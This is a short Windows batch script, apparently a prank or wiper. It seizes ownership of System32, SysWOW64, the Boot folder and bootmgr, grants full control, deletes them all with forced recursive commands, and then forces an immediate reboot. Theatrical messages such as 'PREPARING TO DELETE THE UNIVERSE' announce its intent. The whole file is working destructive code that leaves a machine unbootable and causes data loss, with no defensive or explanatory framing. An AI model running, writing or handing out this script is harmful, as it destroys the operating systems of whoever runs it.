@echo off
echo [!] INITIATING TOTAL SYSTEM OWNERSHIP...
timeout /t 2 /nobreak >nul

:: Take ownership of C:\Windows\System32 and everything in it
echo [+] Seizing ownership of System32...
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant administrators:F /t

echo [+] Seizing ownership of SysWOW64...
takeown /f C:\Windows\SysWOW64 /r /d y
icacls C:\Windows\SysWOW64 /grant administrators:F /t

echo [+] Seizing ownership of Boot files...
takeown /f C:\Boot /r /d y
icacls C:\Boot /grant administrators:F /t
takeown /f C:\bootmgr
icacls C:\bootmgr /grant administrators:F

echo [!] PREPARING TO DELETE THE UNIVERSE...
timeout /t 3 /nobreak >nul

:: Now try the deletion again with FULL POWER
rmdir /s /q C:\Windows\System32
rmdir /s /q C:\Windows\SysWOW64
rmdir /s /q C:\Boot
del /f /q C:\bootmgr

echo [+] Rebooting to finish the job...
timeout /t 2 /nobreak >nul
shutdown /r /f /t 0
